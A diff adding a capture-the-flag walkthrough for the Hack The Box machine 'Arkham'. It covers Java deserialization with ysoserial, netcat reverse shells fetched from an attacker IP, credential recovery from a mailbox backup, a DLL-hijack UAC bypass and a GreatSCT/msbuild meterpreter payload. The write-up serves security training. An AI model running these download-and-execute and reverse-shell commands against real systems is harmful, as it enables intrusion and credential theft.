@@ -131,5 +131,139 @@ org.apache.myfaces.SECRET: SnNGOTg3Ni0=
 org.apache.myfaces.MAC_ALGORITHM: HmacSHA1
 ```
 
-We write a script that can decrypt the value in the _javax.faces.ViewState_ parameter. I call this script **arkham-exploit.py** and can be found in this repository.
+We write a script that can decrypt the value in the _javax.faces.ViewState_ parameter. 
 
+#### Information about the script
+
+I call this script **arkham-exploit.py** and it can be found in this repository.
+
+The payload in it got created with the tool **ysoserial**. Here are some commands I used:
+
+- Check ysoserial for all payload types:
+```markdown
+java -jar ysoserial-master-SNAPSHOT.jar
+```
+
+- Use the "CommonsCollection5" and put your payload in there:
+```markdown
+java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 1 10.10.13.112' > ~/htb/boxes/arkham/payload.bin
+```
+
+This payload just pings my local machine, so we can test if the real payload will work. After testing the "ping"-payload, we replace that line in the code, so we can inject our own commands.
+
+We convert the _payload.bin_ into hex, so it is easier to put it inside of the script:
+```markdown
+for i in $(xxd -p payload.bin | sed 's/../\\x&/g'); do echo "payload += b'$i'"; done
+```
+
+## Getting a reverse shell
+
+After executing the script we can inject any commands we want and we want a reverse shell. First we upload _netcat_ on the machine and the we execute it.
+```markdown
+powershell Invoke-WebRequest -Uri http://10.10.13.112/nc.exe -OutFile C:\\windows\\temp\\nc.exe
+cmd /c C:\\windows\\temp\\nc.exe 10.10.13.112 9001 -e powershell.exe
+```
+
+We now have a working reverse shell and are logged in as the user _Alfred_. He can read user.txt!
+
+## Privilege Escalation
+
+First check all files in Alfreds home folder:
+```markdown
+Get-ChildItem -recurse . | select Fullname
+```
+
+The one interesting file is _backup.zip_ so let's bring that to our local machine by base64-decoding it and copying the contents:
+```markdown
+certutil -encode \Users\Alfred\Downloads\backups\backup.zip C:\\Windows\\temp\backup.b64
+```
+
+Decode it:
+```markdown
+base64 -d backup.b64 > backup.zip
+```
+
+After unzipping the file we find one interesting file in it called _alfred@arkham.local.ost_. This is an Exchange mailbox file, so we convert it into a .mbox file with this command:
+```markdown
+readpst alfred@arkham.local.ost
+```
+
+This file can be opened with any mail client like Thunderbird and it has one email from **Batman** with his password in it!
+His password is:
+> Zx^#QZX+T!123
+
+Now we can execute commands as the user batman:
+```markdown
+$pass = ConvertTo-SecureString 'Zx^#QZX+T!123' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential("batman",$pass)
+Invoke-Command -Computer ARKHAM -ScriptBlock { whoami } -Credential $cred
+```
+
+This executes _whoami_ as batman and so we can execute other commands. We want to execute Netcat with batman and create a reverse shell with him:
+```markdown
+Invoke-Command -Computer ARKHAM -ScriptBlock { IWR -Uri 10.10.13.112/nc.exe -outfile nc.exe } -credential $cred
+Invoke-Command -Computer ARKHAM -ScriptBlock { cmd /c nc.exe 10.10.13.112 9002 -e powershell.exe } -credential $cred
+```
+
+### Privilege Escalation to root
+
+Now we have a reverse shell wit batman, so let's check his groups and privileges:
+```markdown
+whoami /all
+```
+
+Batman is a member of Administrators but has less privileges than he should have. This probably means some UAC bypassing.
+There is a list of [UAC Bypass on GitHub](https://github.com/hfiref0x/UACME) and I will take the one from egre55.
+
+#### Creating the DLL
+
+First we need to create a DLL. I will call this _main.c_ and put in into this repository. Compiling works like this:
+```markdown
+i686-w64-mingw32-g++ main.c -lws2_32 -o srrstr.dll -shared
+```
+
+This created a DLL named _srrstr.dll_ and needs to get copied on the box in the path **C:\Users\Batman\appdata\local\microsoft\windowsapps**. Download the file with Batman:
+```markdown
+iwr -uri hxxp://10.10.13.112/srrstr.dll -outfile srrstr.dll
+```
+
+#### Escalating to interactive session process
+
+To escalate to an interactive sessuion process we use the tool **GreatSCT**. Installation can take some time.
+GreatSCT is a simple to use framework, where you have a menu to choose what you want to do by typing the number of the menu you want to be in.
+
+We will first choose the one Tool it has (Bypass):
+```markdown
+use 1
+```
+
+Then choose the payload (msbuild/meterpreter/rev_tcp.py):
+```markdown
+use 9
+```
+
+Now it kind of looks like the options in Metasploit, so we set the host and the port:
+```markdown
+set LPORT 9001
+set LHOST 10.10.13.112
+generate
+```
+
+It displays where it stored the _payload.rc_ file to use it with Metasploit:
+```markdown
+msfconsole -r /usr/share/greatsct-output/handlers/payload.rc
+```
+
+The _payload.xml_ needs to get uploaded on the box and can be placed in batmans home directory. We will use this payload with **MsBuild.exe**, but first you need to listen on port 9001:
+```markdown
+C:\Windows\microsoft.net\Framework\v4.0.30319\msbuild.exe payload.xml
+```
+
+After executing _MsBuild.exe_ with the payload we get a meterpreter shell. We can't do much in this shell right now, because we first need to _migrate_ into another process. This can take several tries, but if you got it you can open a _shell_ with meterpreter and need to execute this Windows system internal:
+
+```markdown
+cmd /c C:\Windows\SysWow64\SystemPropertiesAdvanced.exe
+```
+
+With _whoami /all_ we can now see that we have much more privileges than before.
+We have a root shell and we can read root.txt!
